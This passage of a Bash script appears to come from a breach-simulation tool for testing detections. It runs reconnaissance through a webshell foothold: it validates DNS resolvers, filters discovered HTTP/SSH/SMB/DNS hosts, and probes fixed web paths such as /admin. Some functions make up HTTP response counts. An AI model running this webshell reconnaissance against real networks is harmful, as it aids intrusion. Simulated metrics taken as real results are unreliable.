[ -z "\$tool" ] && command -v host >/dev/null 2>&1 && tool=host
if [ -z "\$tool" ]; then
printf 'DNS_SERVER_VALIDATION server=%s a_query=fail txt_query=fail random_query=fail selected=no reason=no_dns_tool\n' "\$srv"
exit 0
fi
case "\$tool" in
dig)
    out_a=\$(dig +time=2 +tries=1 @"\$srv" example.com A +short 2>&1)
    out_txt=\$(dig +time=2 +tries=1 @"\$srv" example.com TXT +short 2>&1)
    out_rnd=\$(dig +time=2 +tries=1 @"\$srv" "\$rnd" A +short 2>&1)
    ;;
nslookup)
    out_a=\$(nslookup -timeout=2 example.com "\$srv" 2>&1)
    out_txt=\$(nslookup -timeout=2 -type=TXT example.com "\$srv" 2>&1)
    out_rnd=\$(nslookup -timeout=2 "\$rnd" "\$srv" 2>&1)
    ;;
host)
    out_a=\$(host -W 2 -t A example.com "\$srv" 2>&1)
    out_txt=\$(host -W 2 -t TXT example.com "\$srv" 2>&1)
    out_rnd=\$(host -W 2 -t A "\$rnd" "\$srv" 2>&1)
    ;;
esac
dns_is_transport_fail(){
case "\$1" in
    *timed\ out*|*TIMEOUT*|*connection\ timed\ out*|*Connection\ refused*|*refused*|*no\ servers*|*Network\ is\ unreachable*|*communications\ error*) return 0 ;;
esac
return 1
}
dns_is_nxdomain(){
printf '%s' "\$1" | grep -Eiq 'NXDOMAIN|not found|Host not found|can.t find|NOTFOUND' && return 0
return 1
}
if ! dns_is_transport_fail "\$out_a"; then
if dns_is_nxdomain "\$out_a"; then :; elif [ -n "\$out_a" ]; then a_q='success'; fi
fi
if ! dns_is_transport_fail "\$out_txt"; then
if dns_is_nxdomain "\$out_txt"; then :; elif [ -n "\$out_txt" ]; then txt_q='success'; fi
fi
if ! dns_is_transport_fail "\$out_rnd"; then
if dns_is_nxdomain "\$out_rnd"; then rnd_q='success'; fi
fi
printf 'DNS_SERVER_VALIDATION server=%s a_query=%s txt_query=%s random_query=%s selected=no reason=probe_complete\n' "\$srv" "\$a_q" "\$txt_q" "\$rnd_q"
EOF
    remote_bash_script_close 'DNS_VAL_SCRIPT'
}

dns_validation_field_is_literal() {
    local val="$1"
    [[ -z "${val}" || "${val}" == *'$'* ]] && return 0
    return 1
}

dns_validation_field_is_valid() {
    local val="$1"
    [[ "${val}" == success || "${val}" == fail ]]
}

parse_dns_server_validation_line() {
    local out="$1" line
    local server="" a_query="fail" txt_query="fail" random_query="fail" selected="no" reason=""
    line=$(printf '%s\n' "${out}" | tr -d '\r' | grep -E 'DNS_SERVER_VALIDATION' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        server=$(dns_stats_field_from_line "${line}" server)
        a_query=$(dns_stats_field_from_line "${line}" a_query)
        txt_query=$(dns_stats_field_from_line "${line}" txt_query)
        random_query=$(dns_stats_field_from_line "${line}" random_query)
        selected=$(dns_stats_field_from_line "${line}" selected)
        reason=$(dns_stats_field_from_line "${line}" reason)
    fi
    if dns_validation_field_is_literal "${a_query}" || \
    dns_validation_field_is_literal "${txt_query}" || \
    dns_validation_field_is_literal "${random_query}" || \
    ! dns_validation_field_is_valid "${a_query}" || \
    ! dns_validation_field_is_valid "${txt_query}" || \
    ! dns_validation_field_is_valid "${random_query}"; then
        reason="DNS_SERVER_VALIDATION_PARSE_ERROR"
        a_query="fail"
        txt_query="fail"
        random_query="fail"
        selected="no"
    fi
    printf '%s %s %s %s %s %s' \
        "${server}" "${a_query:-fail}" "${txt_query:-fail}" "${random_query:-fail}" "${selected:-no}" "${reason:-}"
}

validate_dns_server_remote() {
    dns_tunnel_guard_legacy_call "resolver validation" && return 1
    local server="$1" source="$2"
    local tcp53 out a_query txt_query random_query selected reason usable=false
    server=$(poc_extract_ipv4 "${server}")
    [[ -z "${server}" ]] && return 1
    tcp53=$(dns_server_check_tcp53_open_remote "${server}")
    log_dns_server_candidate "${server}" "${source}" "${tcp53}"
    if [[ "${DRY_RUN}" == true ]]; then
        log_dns_server_validation "${server}" success success success yes dry-run
        return 0
    fi
    out=$(run_webshell_quick "dns-validate-${server}" "$(build_dns_server_validation_remote_cmd "${server}")" 2>/dev/null || true)
    read -r _server a_query txt_query random_query selected reason <<< "$(parse_dns_server_validation_line "${out}")"
    if [[ "${reason}" == "DNS_SERVER_VALIDATION_PARSE_ERROR" ]]; then
        log_dns_server_validation "${server}" fail fail fail no "${reason}"
        log_message "WARN" "DNS server validation parse error for ${server} — raw output may contain unexpanded variables" >&2
        return 1
    fi
    if [[ "${a_query}" == success || "${txt_query}" == success || "${random_query}" == success ]]; then
        usable=true
        selected=yes
        reason="${reason:-query_ok}"
    else
        selected=no
        reason="${reason:-no_query_success}"
    fi
    log_dns_server_validation "${server}" "${a_query}" "${txt_query}" "${random_query}" "${selected}" "${reason}"
    [[ "${usable}" == true ]]
}

remote_validate_dns_usable() {
    local host="$1"
    if validate_dns_server_remote "${host}" "scan"; then
        printf 'DNS_USABLE'
    else
        printf 'DNS_DEAD'
    fi
}

filter_usable_hosts_to_remote_file() {
    local src_file="$1" dst_file="$2" validator_fn="$3" scheme="${4:-}" port="${5:-}"
    local host result usable=0 skipped=0 dst_cache probe_host probe_port
    [[ -z "${src_file}" || -z "${dst_file}" ]] && { echo "0:0"; return 0; }
    dst_cache="${LOCAL_STATE_DIR}/remote_hosts/${dst_file}"
    : > "${dst_cache}" 2>/dev/null || true
    while IFS= read -r host; do
        [[ -z "${host}" ]] && continue
        pipeline_stop_requested && break
        probe_host="${host}"
        probe_port="${port}"
        if [[ "${host}" == *:* ]]; then
            probe_host="${host%%:*}"
            probe_port="${host##*:}"
        fi
        result=$("${validator_fn}" "${probe_host}" "${scheme}" "${probe_port}" 2>/dev/null | tr -d '\r' | tail -n 1)
        if [[ "${result}" == *"_USABLE"* ]]; then
            discovery_local_cache_append "${host}" "${dst_file}"
            run_webshell_quick "usable-append-${dst_file}-${host}" \
                "mkdir -p '${REMOTE_RUNTIME_DIR}' && echo '${host}' >> '${REMOTE_RUNTIME_DIR}/${dst_file}'" \
                >/dev/null 2>&1 || true
            usable=$((usable + 1))
        else
            skipped=$((skipped + 1))
            state_append "usable_validation_skipped.log" "${dst_file} host=${host} reason=${result:-dead}"
            DEGRADED_TELEMETRY=true
        fi
    done < <(get_local_hosts "${src_file}")
    if [[ -s "${dst_cache}" ]]; then
        sort -u "${dst_cache}" -o "${dst_cache}"
    fi
    echo "${usable}:${skipped}"
}

promote_discovered_hosts_to_usable_cache() {
    local pair src dst src_cache dst_cache n total=0
    for pair in \
        "http_targets.txt:usable_http_targets.txt" \
        "https_targets.txt:usable_https_targets.txt" \
        "ssh_hosts.txt:usable_ssh_hosts.txt" \
        "smb_hosts.txt:usable_smb_hosts.txt" \
        "dns_hosts.txt:usable_dns_hosts.txt"; do
        src="${pair%%:*}"
        dst="${pair#*:}"
        src_cache="${LOCAL_STATE_DIR}/remote_hosts/${src}"
        dst_cache="${LOCAL_STATE_DIR}/remote_hosts/${dst}"
        [[ -s "${src_cache}" ]] || continue
        extract_host_file_lines < "${src_cache}" | sort -u > "${dst_cache}"
        n=$(count_discovered_ips_in_file "${dst_cache}")
        total=$((total + n))
    done
    SERVICES_USABLE_TOTAL="${total}"
}

stage_validate_discovered_services_usable() {
    if fast_safe_mode_enabled 2>/dev/null; then
        add_executed_stage "Service Usability Validation"
        set_stage_result "Service Usability Validation" "Skipped" "fast-safe: reachability from service discovery only"
        log_message "OK" "FAST_SAFE_SKIP_STAGE name=Service Usability Validation reason=fast_safe_dedicated_pipeline"
        return 0
    fi
    local http_n https_n ssh_n smb_n dns_n usable_total=0 pair
    add_executed_stage "Service Usability Validation"
    write_report_entries "usable_validation" "T1046" "NDR/XDR" "Service Validation" "${TARGET_NET}" "start" "usable check before follow-up"

    if [[ "${DRY_RUN}" == true ]]; then
        SERVICES_USABLE_TOTAL=$(count_all_discovered_services)
        set_stage_result "Service Usability Validation" "Success" "dry-run (using discovered hosts)"
        return 0
    fi

    run_webshell "init-usable-target-files" \
        "for f in usable_http_targets.txt usable_https_targets.txt usable_ssh_hosts.txt usable_smb_hosts.txt usable_dns_hosts.txt; do : > '${REMOTE_RUNTIME_DIR}'/\$f; done" \
        >/dev/null 2>&1 || true

    pair=$(filter_usable_hosts_to_remote_file "http_targets.txt" "usable_http_targets.txt" remote_validate_http_usable "http" "80")
    http_n=${pair%%:*}
    pair=$(filter_usable_hosts_to_remote_file "https_targets.txt" "usable_https_targets.txt" remote_validate_http_usable "https" "443")
    https_n=${pair%%:*}
    pair=$(filter_usable_hosts_to_remote_file "ssh_hosts.txt" "usable_ssh_hosts.txt" remote_validate_ssh_usable)
    ssh_n=${pair%%:*}
    pair=$(filter_usable_hosts_to_remote_file "smb_hosts.txt" "usable_smb_hosts.txt" remote_validate_smb_usable)
    smb_n=${pair%%:*}
    pair=$(filter_usable_hosts_to_remote_file "dns_hosts.txt" "usable_dns_hosts.txt" remote_validate_dns_usable)
    dns_n=${pair%%:*}

    usable_total=$((http_n + https_n + ssh_n + smb_n + dns_n))
    SERVICES_USABLE_TOTAL="${usable_total}"
    state_append "usable_validation.log" "http=${http_n} https=${https_n} ssh=${ssh_n} smb=${smb_n} dns=${dns_n} total=${usable_total}"

    if (( usable_total == 0 )) && (( SERVICES_DISCOVERED_TOTAL > 0 )); then
        log_message "WARN" "TCP usability checks returned 0 — promoting discovered hosts to follow-up lists"
        add_fallback_usage "Usability validation: promoting nmap/TCP discovery results for follow-up"
        promote_discovered_hosts_to_usable_cache
        usable_total="${SERVICES_USABLE_TOTAL}"
        DEGRADED_TELEMETRY=true
    elif (( usable_total == 0 )); then
        log_message "WARN" "No usable services after validation — follow-up will use raw discovery lists"
        add_fallback_usage "Usability validation: no hosts passed; follow-up uses raw discovery files"
        DEGRADED_TELEMETRY=true
    else
        log_message "OK" "Usable services validated: ${usable_total} host(s)"
    fi
    set_stage_result "Service Usability Validation" "Success" "usable=${usable_total}"
    write_report_entries "usable_validation" "T1046" "NDR/XDR" "Service Validation" "${TARGET_NET}" "success" "usable=${usable_total}"
}

get_followup_hosts() {
    local raw="$1" usable="usable_${1}"
    local raw_hosts usable_hosts
    [[ -z "${raw}" ]] && return 0
    raw_hosts=$(get_local_hosts "${raw}" 2>/dev/null)
    usable_hosts=$(get_local_hosts "${usable}" 2>/dev/null)
    if [[ -n "${raw_hosts}" ]]; then
        printf '%s\n' "${raw_hosts}"
        [[ -n "${usable_hosts}" ]] && printf '%s\n' "${usable_hosts}"
    elif [[ -n "${usable_hosts}" ]]; then
        printf '%s\n' "${usable_hosts}"
    fi | extract_host_file_lines | sort -u
}

followup_plan_http_requests() {
    local http_nodes="$1" https_nodes="$2" req_per_host="$3"
    local http_n https_n targets
    http_n=$(count_hosts_blob "${http_nodes}")
    https_n=$(count_hosts_blob "${https_nodes}")
    targets=$((http_n + https_n))
    (( targets < 1 )) && targets=1
    (( targets > 3 )) && targets=3
    echo $(( targets * req_per_host ))
}

resolve_http_scan_wave_plan() {
    # Detection-focused HTTP follow-up: fixed paths, max 2 hosts, <=20 total requests.
    HTTP_FOLLOWUP_MAX_HOSTS=2
    HTTP_FOLLOWUP_URLS_PER_HOST=10
    HTTP_FOLLOWUP_MAX_REQUESTS=20
    HTTP_SCAN_UNIQUE_URL_TARGET="${HTTP_FOLLOWUP_URLS_PER_HOST}"
    HTTP_SCAN_UNIQUE_URL_RECOMMENDED="${HTTP_FOLLOWUP_URLS_PER_HOST}"
    HTTP_SCAN_WAVES=1
    HTTP_SCAN_WAVE_FAIL_MIN=0
    HTTP_SCAN_WAVE_FAIL_MAX=0
    HTTP_SCAN_WAVE_SLEEP=0
    HTTP_SCAN_WAVE_ATTEMPT_CAP=15
    HTTP_SCAN_INTER_REQUEST_SLEEP=0
    HTTP_SCAN_RECON_MIN_FAILED=1
    HTTP_SCAN_RECON_MIN_FAIL_RATIO=0
    HTTP_FOLLOWUP_REQUESTS="${HTTP_FOLLOWUP_MAX_REQUESTS}"
    HTTP_SCAN_REPEAT="${HTTP_FOLLOWUP_MAX_REQUESTS}"
    resolve_http_detection_window_plan
}

sync_url_scan_unique_metrics() {
    local total=$((URL_SCAN_UNIQUE_FAILED + URL_SCAN_UNIQUE_SUCCESS))
    if (( total > 0 )); then
        URL_SCAN_UNIQUE_FAIL_RATIO=$((URL_SCAN_UNIQUE_FAILED * 100 / total))
    else
        URL_SCAN_UNIQUE_FAIL_RATIO=0
    fi
    # Stellar model: total_failed = unique URLs with HTTP error status
    URL_SCAN_ANOMALY_SCORE=$((URL_SCAN_UNIQUE_FAILED * 12 + URL_SCAN_UNIQUE_ATTEMPTED / 4))
}

compute_url_scan_anomaly_score() {
    sync_url_scan_unique_metrics
}

simulate_url_scan_unique_metrics() {
    local target="${1:-${HTTP_FOLLOWUP_PLANNED_REQUESTS:-${HTTP_SCAN_UNIQUE_URL_TARGET:-10}}}"
    target=$(safe_int "${target}")
    (( target < 1 )) && target="${HTTP_FOLLOWUP_MAX_REQUESTS:-20}"
    URL_SCAN_UNIQUE_ATTEMPTED="${target}"
    URL_SCAN_UNIQUE_FAILED=$((target / 3))
    URL_SCAN_UNIQUE_SUCCESS=$((target - URL_SCAN_UNIQUE_FAILED))
    (( URL_SCAN_UNIQUE_SUCCESS < 1 )) && URL_SCAN_UNIQUE_SUCCESS=1 && URL_SCAN_UNIQUE_FAILED=$((target - 1))
    sync_url_scan_unique_metrics
}

format_url_scan_stellar_model_block() {
    compute_url_scan_anomaly_score
    cat <<EOF
HTTP Follow-up (detection traffic — not a vulnerability scanner)
- Discovered hosts                   : ${HTTP_FOLLOWUP_DISCOVERED_HOSTS:-0}
- Selected hosts (max ${HTTP_FOLLOWUP_MAX_HOSTS:-2}) : ${HTTP_FOLLOWUP_SELECTED_HOSTS:-0}
- URLs per host (fixed paths)        : ${HTTP_FOLLOWUP_URLS_PER_HOST:-10}
- Planned requests (cap)             : ${HTTP_FOLLOWUP_PLANNED_REQUESTS:-0}
- Attempted                          : ${HTTP_REQUESTS_ATTEMPTED:-0}
- Responses                          : ${WEB_RESPONSES_RECEIVED:-0}
- Connection established             : ${HTTP_FOLLOWUP_CONNECTION_ESTABLISHED:-${HTTP_CONNECTED:-0}}
- Success criterion                  : attempted>0 AND responses>0
- Expected Detection                 : HTTP access / web probe telemetry
- Expected Technique                 : T1595 Active Scanning
- Fixed paths                        : / /login /admin /api /status /health /robots.txt /favicon.ico /index.html /dashboard
EOF
}

sync_http_scan_fail_ratio() {
    local total=$((HTTP_SCAN_FAILED_RESPONSES + HTTP_SCAN_SUCCESS_RESPONSES))
    if (( total > 0 )); then
        HTTP_SCAN_FAIL_RATIO=$((HTTP_SCAN_FAILED_RESPONSES * 100 / total))
    else
        HTTP_SCAN_FAIL_RATIO=0
    fi
}

simulate_http_scan_response_metrics() {
    local planned="$1"
    simulate_url_scan_unique_metrics "${HTTP_SCAN_UNIQUE_URL_TARGET:-75}"
    planned="${URL_SCAN_UNIQUE_ATTEMPTED}"
    HTTP_SCAN_FAILED_RESPONSES=$((URL_SCAN_UNIQUE_FAILED))
    HTTP_SCAN_SUCCESS_RESPONSES=$((URL_SCAN_UNIQUE_SUCCESS))
    (( HTTP_SCAN_SUCCESS_RESPONSES < 1 )) && HTTP_SCAN_SUCCESS_RESPONSES=1
    HTTP_400_COUNT=$((HTTP_SCAN_FAILED_RESPONSES * 22 / 100))
    HTTP_403_COUNT=$((HTTP_SCAN_FAILED_RESPONSES * 28 / 100))
    HTTP_404_COUNT=$((HTTP_SCAN_FAILED_RESPONSES * 38 / 100))
    HTTP_405_COUNT=$((HTTP_SCAN_FAILED_RESPONSES * 12 / 100))
    HTTP_200_COUNT=$((HTTP_SCAN_SUCCESS_RESPONSES / 2))
    HTTP_301_COUNT=$((HTTP_SCAN_SUCCESS_RESPONSES / 4))
    HTTP_302_COUNT=$((HTTP_SCAN_SUCCESS_RESPONSES / 4))
    HTTP_401_COUNT=$((HTTP_SCAN_FAILED_RESPONSES / 10))
    HTTPS_SCAN_FAILED_RESPONSES=$((HTTP_SCAN_FAILED_RESPONSES / 3))
    HTTPS_SCAN_SUCCESS_RESPONSES=$((HTTP_SCAN_SUCCESS_RESPONSES / 3))
    HTTPS_403_COUNT=$((HTTPS_SCAN_FAILED_RESPONSES * 35 / 100))
    HTTPS_404_COUNT=$((HTTPS_SCAN_FAILED_RESPONSES * 45 / 100))
    HTTPS_405_COUNT=$((HTTPS_SCAN_FAILED_RESPONSES * 20 / 100))
    HTTPS_200_COUNT=$((HTTPS_SCAN_SUCCESS_RESPONSES / 2))
    HTTP_PROPFIND_COUNT=$((planned / 8))
    HTTP_POST_COUNT=$((planned / 6))
    HTTP_OPTIONS_COUNT=$((planned / 10))
    sync_http_scan_fail_ratio
    sync_web_combined_metrics
}

probe_http_scan_responsive() {
    local host="$1" port="$2" scheme="$3" curl_tls="" out url
    [[ "${host}" == *:* ]] && host="${host%%:*}"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    if [[ "${HAS_curl:-false}" == true ]]; then
        out=$(run_webshell_quick "http-scan-probe-${host}-${port}" \
            "code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 3 '${url}' 2>/dev/null || echo 000); if [[ \"\${code}\" != \"000\" && -n \"\${code}\" ]]; then echo HTTP_RESP_OK:\${code}; else echo HTTP_RESP_NONE; fi" \
            2>/dev/null | tr -d '\r' | tail -n 1 || true)
        [[ "${out}" == HTTP_RESP_OK:* ]] && return 0
    fi
    remote_probe_web_tcp_open "${host}" "${port}"
}

collect_http_scan_candidate_hosts() {
    local http https merged=""
    http=$(collect_hosts_from_remote_file "reachable_http_targets.txt")
    https=$(collect_hosts_from_remote_file "reachable_https_targets.txt")
    merged=$(printf '%s\n%s' "${http}" "${https}")
    printf '%s\n' "${merged}" | extract_host_file_lines | sort -u
}

select_http_scan_targets() {
    select_http_followup_targets "$(collect_http_url_scan_candidates)"
}

http_followup_port_rank() {
    local port
    port=$(safe_int "$1")
    case "${port}" in
        443) printf '1' ;;
        8443) printf '2' ;;
        80) printf '3' ;;
        8080) printf '4' ;;
        8000) printf '5' ;;
        *) printf '99' ;;
    esac
}

http_followup_fixed_paths_csv() {
    printf '%s' '/,/login,/admin,/api,/status,/health,/robots.txt,/favicon.ico,/index.html,/dashboard'
}

log_http_scan_limit_applied() {
    local msg="HTTP_SCAN_LIMIT_APPLIED selected_hosts=${HTTP_FOLLOWUP_SELECTED_HOSTS:-0} urls_per_host=${HTTP_FOLLOWUP_URLS_PER_HOST:-10} planned_requests=${HTTP_FOLLOWUP_PLANNED_REQUESTS:-0}"
    state_append "http_url_scan.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

log_http_target_selected() {
    local host="$1" port="$2" rank="$3"
    local msg="HTTP_TARGET_SELECTED host=${host} port=${port} rank=${rank}"
    state_append "http_url_scan_target_selection.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

# Max 2 hosts by port priority: 443, 8443, 80, 8080, 8000
select_http_followup_targets() {
    local candidates="$1" target_line host port scheme rank discovered=0
    local -a sorted_lines=()
    local selected="" sel_count=0 planned=0
    discovered=$(printf '%s\n' "${candidates}" | awk 'NF{c++} END{print c+0}')
    HTTP_FOLLOWUP_DISCOVERED_HOSTS="${discovered}"
    while IFS= read -r target_line; do
        [[ -z "${target_line}" ]] && continue
        if [[ "${target_line}" == *" "* ]]; then
            read -r host port scheme <<< "${target_line}"
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
            :
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
            :
        else
            continue
        fi
        read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
        rank=$(http_followup_port_rank "${port}")
        sorted_lines+=("${rank} ${host} ${port} ${scheme}")
    done <<< "${candidates}"
    if ((${#sorted_lines[@]} > 0)); then
        mapfile -t sorted_lines < <(printf '%s\n' "${sorted_lines[@]}" | sort -n -k1,1)
    fi
    sel_count=0
    for target_line in "${sorted_lines[@]}"; do
        (( sel_count >= HTTP_FOLLOWUP_MAX_HOSTS )) && break
        read -r rank host port scheme <<< "${target_line}"
        sel_count=$((sel_count + 1))
        log_http_target_selected "${host}" "${port}" "${sel_count}"
        selected=$(printf '%s\n%s' "${selected}" "${host} ${port} ${scheme}")
        if (( sel_count == 1 )); then
            HTTP_URL_SCAN_SELECTED_TARGET="${scheme}://${host}:${port}"
            HTTP_URL_SCAN_SELECTION_LINE="${host} ${port} ${scheme}"
            http_url_scan_commit_best_target "${host}" "${port}" "${scheme}" \
                "$((1000 - rank))" "detection_followup_rank_${sel_count}"
        fi
    done
    HTTP_FOLLOWUP_SELECTED_HOSTS="${sel_count}"
    HTTP_URL_SCAN_CANDIDATE_COUNT="${discovered}"
    planned=$((sel_count * HTTP_FOLLOWUP_URLS_PER_HOST))
    (( planned > HTTP_FOLLOWUP_MAX_REQUESTS )) && planned="${HTTP_FOLLOWUP_MAX_REQUESTS}"
    HTTP_FOLLOWUP_PLANNED_REQUESTS="${planned}"
    HTTP_REQUESTS_PLANNED="${planned}"
    HTTP_SCAN_TARGET_COUNT="${sel_count}"
    log_http_scan_limit_applied
    printf '%s\n' "${selected}" | awk 'NF'
}

collect_http_url_scan_candidates() {
    local line host port scheme responsive="" count=0 max_targets=20 degraded=false source_kind=""
    URL_SCAN_DEGRADED_FALLBACK=false
    for scheme in http https; do
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            (( count >= max_targets )) && break
            read -r host port scheme <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
            if fast_safe_mode_enabled 2>/dev/null; then
                responsive=$(printf '%s\n%s' "${responsive}" "${host} ${port} ${scheme}")
                count=$((count + 1))
                source_kind=reachable_http
            elif [[ "${DRY_RUN}" == true ]] || remote_probe_web_reachable "${host}" "${port}" "${scheme}"; then
                responsive=$(printf '%s\n%s' "${responsive}" "${host} ${port} ${scheme}")
                count=$((count + 1))
                source_kind=reachable_http
            fi
        done < <(collect_hosts_from_remote_file "reachable_${scheme}_targets.txt")
    done
    if (( count == 0 )) && ! fast_safe_mode_enabled 2>/dev/null; then
        degraded=true
        for scheme in http https; do
            while IFS= read -r line; do
                [[ -z "${line}" ]] && continue
                (( count >= max_targets )) && break
                read -r host port scheme <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
                responsive=$(printf '%s\n%s' "${responsive}" "${host} ${port} ${scheme}")
                count=$((count + 1))
            done < <(collect_web_target_candidates "${scheme}")
        done
        if (( count > 0 )); then
            URL_SCAN_DEGRADED_FALLBACK=true
            source_kind=fallback
            log_message "WARN" "URL Scan using degraded fallback targets (raw+usable candidates; reachability empty or failed)"
            add_fallback_usage "URL Scan: degraded fallback from raw+usable web candidates"
        fi
    elif (( count == 0 )) && fast_safe_mode_enabled 2>/dev/null; then
        log_message "WARN" "FAST_SAFE_FAIL_FAST module=http reachable_http=0 reachable_https=0 action=no_candidate_fallback"
    fi
    [[ -z "${source_kind}" && count -gt 0 ]] && source_kind=candidate_http
    HTTP_URL_SCAN_SOURCE="${source_kind:-none}"
    if (( count > 0 )); then
        log_message "OK" "HTTP_URL_SCAN_SOURCE source=${HTTP_URL_SCAN_SOURCE}"
    fi
    printf '%s\n' "${responsive}" | awk 'NF'
}

collect_http_url_scan_candidates_from_reachable() {
    collect_http_url_scan_candidates
}

http_classify_scan_result() {
    local http_status="$1" curl_exit="$2"
    http_status=$(printf '%s' "${http_status}" | tr -cd '0-9')
    curl_exit=$(safe_int "${curl_exit}")
    if [[ -z "${http_status}" || "${http_status}" == "000" ]]; then
        case "${curl_exit}" in
            6) printf '%s' 'dns_error'; return 0 ;;
            7) printf '%s' 'connection_error'; return 0 ;;
            28) printf '%s' 'timeout'; return 0 ;;
            35) printf '%s' 'tls_error'; return 0 ;;
            *) printf '%s' 'unknown_error'; return 0 ;;
        esac
    fi
    while [[ ${#http_status} -lt 3 ]]; do http_status="0${http_status}"; done
    http_status="${http_status:0:3}"
    case "${http_status}" in
        2*) printf '%s' 'response_2xx' ;;
        3*) printf '%s' 'response_3xx' ;;
        4*) printf '%s' 'response_4xx' ;;
        5*) printf '%s' 'response_5xx' ;;
        *) printf '%s' 'unknown_error' ;;
    esac
}

http_record_url_event() {
    local target="$1" url="$2" method="${3:-GET}" ua_class="${4:-payload}" http_status="$5" curl_exit="$6" result="${7:-}" duration_ms="${8:-0}"
    local seq=0 http_ev_status="response"
    event_store_paths_refresh
    [[ -z "${result}" ]] && result=$(http_classify_scan_result "${http_status}" "${curl_exit}")
    case "${result}" in
        timeout) http_ev_status="timeout" ;;
        dns_error) http_ev_status="dns_failure" ;;
        connection_error) http_ev_status="connection_refused" ;;
        tls_error|unknown_error) http_ev_status="error" ;;
        *) http_ev_status="response" ;;
    esac
    HTTP_URL_GEN_SEQ=$((HTTP_URL_GEN_SEQ + 1))
    seq="${HTTP_URL_GEN_SEQ}"
    record_http_event "${HTTP_URL_SCAN_RUN_ID:-main}" "${target}" "${url}" "${method}" "${http_status}" "${curl_exit}" "${http_ev_status}" "local" "HTTP_URL_SCAN"
    log_message "OK" "HTTP_URL_ATTEMPTED url=${url} seq=${seq} run_id=${HTTP_URL_SCAN_RUN_ID:-main}" >&2
    log_message "OK" "HTTP_URL_COMPLETED url=${url} seq=${seq} status=${http_status} result=${result}" >&2
}

http_sot_init_run() {
    poc_sot_paths_init
    if [[ "${HTTP_EMERGENCY_BURST_ACTIVE}" == true ]]; then
        HTTP_URL_SCAN_RUN_ID="emergency"
    else
        HTTP_URL_SCAN_RUN_ID="main"
        HTTP_URL_GEN_SEQ=0
    fi
}

http_refresh_sot_from_events() {
    local summary="" attempted=0 completed=0 real_failed=0 timeouts=0 skipped=0
    event_store_paths_refresh
    summary=$(build_module_summary_from_events "HTTP_URL_SCAN" 2>/dev/null || true)
    [[ -n "${summary}" ]] || return 1
    attempted=$(safe_int "$(event_summary_field "${summary}" attempted 0)")
    completed=$(safe_int "$(event_summary_field "${summary}" completed 0)")
    real_failed=$(safe_int "$(event_summary_field "${summary}" http_4xx 0)")
    timeouts=$(safe_int "$(event_summary_field "${summary}" timeout 0)")
    HTTP_URL_ATTEMPT_COUNT="${attempted}"
    HTTP_URL_COMPLETE_COUNT="${completed}"
    HTTP_REQUESTS_ATTEMPTED="${attempted}"
    URL_SCAN_UNIQUE_ATTEMPTED="${completed}"
    HTTP_URL_SCAN_REAL_FAILED="${real_failed}"
    HTTP_URL_SCAN_TIMEOUT_COUNT="${timeouts}"
    HTTP_RESPONSES_RECEIVED="${completed}"
    WEB_RESPONSES_RECEIVED="${completed}"
    local gen=$(safe_int "${HTTP_URL_GEN_COUNT:-${HTTP_SCAN_UNIQUE_URL_TARGET:-0}}")
    skipped=$((gen - attempted))
    (( skipped < 0 )) && skipped=0
    HTTP_URL_SKIP_COUNT="${skipped}"
    log_message "OK" "HTTP_SOT_REFRESH source=${EVENT_HTTP_EVENTS} attempted=${attempted} completed=${completed} real_failed=${real_failed} timeouts=${timeouts}"
    return 0
}

http_sot_bug_fail_fast() {
    local summary="" ff=""
    event_stage_mark_executed "HTTP_URL_SCAN" "${HTTP_URL_SCAN_RUN_ID:-main}"
    summary=$(build_module_summary_from_events "HTTP_URL_SCAN" 2>/dev/null || true)
    ff=$(event_fail_fast_invariants "HTTP_URL_SCAN" "${summary}" "${HTTP_URL_SCAN_RUN_ID:-main}" 2>/dev/null || true)
    if [[ "${ff}" == CODE_FAILURE ]]; then
        log_message "ERROR" "HTTP_SOT_BUG_FAIL_FAST flags=${EVENT_SOT_FAIL_FAST_FLAGS} ${summary}"
        state_append "http_url_scan.log" "HTTP_SOT_BUG_FAIL_FAST flags=${EVENT_SOT_FAIL_FAST_FLAGS}"
        return 1
    fi
    return 0
}

http_url_scan_decision_evaluate() {
    local summary="" result="" reason=""
    event_store_paths_refresh
    summary=$(build_module_summary_from_events "HTTP_URL_SCAN" 2>/dev/null || true)
    read -r result reason <<< "$(validate_module_from_summary "HTTP_URL_SCAN" "${summary}" "${HTTP_URL_SCAN_RUN_ID:-main}")"
    log_message "OK" "HTTP_URL_SCAN_DECISION result=${result} reason=${reason}"
    printf '%s %s' "${result}" "${reason}"
}

http_url_scan_sum_status_codes() {
    echo $((
        ${HTTP_200_COUNT:-0} + ${HTTP_301_COUNT:-0} + ${HTTP_302_COUNT:-0} +
        ${HTTP_401_COUNT:-0} + ${HTTP_400_COUNT:-0} + ${HTTP_403_COUNT:-0} +
        ${HTTP_404_COUNT:-0} + ${HTTP_405_COUNT:-0} + ${HTTP_500_COUNT:-0} +
        ${HTTPS_200_COUNT:-0} + ${HTTPS_301_COUNT:-0} + ${HTTPS_302_COUNT:-0} +
        ${HTTPS_401_COUNT:-0} + ${HTTPS_400_COUNT:-0} + ${HTTPS_403_COUNT:-0} +
        ${HTTPS_404_COUNT:-0} + ${HTTPS_405_COUNT:-0}
    ))
}

http_url_scan_sum_success_status_codes() {
    echo $((
        ${HTTP_200_COUNT:-0} + ${HTTP_301_COUNT:-0} + ${HTTP_302_COUNT:-0} +
        ${HTTPS_200_COUNT:-0} + ${HTTPS_301_COUNT:-0} + ${HTTPS_302_COUNT:-0}
    ))
}

http_url_scan_sum_failed_status_codes() {
    echo $((
        ${HTTP_400_COUNT:-0} + ${HTTP_401_COUNT:-0} + ${HTTP_403_COUNT:-0} +
        ${HTTP_404_COUNT:-0} + ${HTTP_405_COUNT:-0} + ${HTTP_500_COUNT:-0} +
        ${HTTPS_400_COUNT:-0} + ${HTTPS_401_COUNT:-0} + ${HTTPS_403_COUNT:-0} +
        ${HTTPS_404_COUNT:-0} + ${HTTPS_405_COUNT:-0}
    ))
}

